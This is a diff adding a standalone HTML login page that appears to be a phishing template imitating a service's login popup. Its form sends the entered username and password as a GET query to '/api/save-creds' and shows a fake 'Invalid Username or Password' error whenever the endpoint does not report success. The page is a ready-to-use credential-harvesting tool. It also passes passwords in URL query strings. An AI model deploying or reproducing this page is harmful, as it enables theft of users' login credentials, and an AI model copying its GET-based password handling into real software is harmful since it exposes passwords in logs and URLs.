@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Login</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { background: #1e1e1e; color: #ccc; font-family: Arial, sans-serif; padding: 16px; }
+.popup-title { display: block; color: #fff; font-size: 18px; margin-bottom: 16px; }
+.popup-holder { width: 100%; max-width: 480px; margin: 0 auto; }
+.generic-error {
+	background: #3a1a1a; border: 1px solid #6a2a2a; color: #cf6f6f;
+	padding: 10px 14px; border-radius: 4px; font-size: 13px; margin-bottom: 14px;
+}
+.row { margin-bottom: 14px; }
+.field-label { display: block; font-size: 12px; color: #999; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 0.4px; }
+.textfield {
+	width: 100%; padding: 10px 12px; font-size: 14px;
+	background: #2a2a2a; border: 1px solid #3a3a3a; color: #fff;
+	border-radius: 4px; transition: border-color 0.2s;
+}
+.textfield:focus { outline: none; border-color: #e5a00d; }
+.checkbox { margin-right: 6px; }
+.bottom { margin-top: 18px; }
+.submit {
+	width: 100%; padding: 11px; background: #e5a00d; color: #000;
+	font-weight: bold; font-size: 15px; border: none; border-radius: 4px;
+	cursor: pointer; transition: background 0.2s;
+}
+.submit:hover { background: #f0b030; }
+@media (max-width: 400px) {
+	.popup-title { font-size: 16px; }
+	.textfield { font-size: 13px; padding: 9px 10px; }
+	.submit { font-size: 14px; }
+}
+</style>
+</head>
+<body>
+<strong class="popup-title">Login</strong>
+<div class="popup-holder">
+	<form action="/api/save-creds" method="GET" onsubmit="event.preventDefault();fetch('/api/save-creds?'+new URLSearchParams(new FormData(this))).then(function(r){return r.json();}).then(function(d){if(d.login_status!=='success'){document.querySelector('.generic-error').style.display='block';}}).catch(function(e){console.error(e);});return false;">
+		<div class="generic-error" style="display: none;">Invalid Username or Password. Username and Password are case-sensitive.</div>
+		<div>
+			<div class="row">
+				<label for="login_username" class="field-label required">Username</label>
+				<input type="text" name="username" id="login_username" class="textfield" placeholder="please enter login here"/>
+			</div>
+
+			<div class="row">
+				<label for="login_pass" class="field-label required">Password</label>
+				<input type="password" name="password" id="login_pass" class="textfield"/>
+			</div>
+
+			<div class="row">
+				<input type="checkbox" name="remember_me" id="login_remember_me" class="checkbox" value="1"/>
+				<label for="login_remember_me">remember me</label>
+			</div>
+
+			<div class="bottom">
+				<input type="submit" class="submit" value="Log in"/>
+			</div>
+		</div>
+	</form>
+</div>
+</body>
+</html>
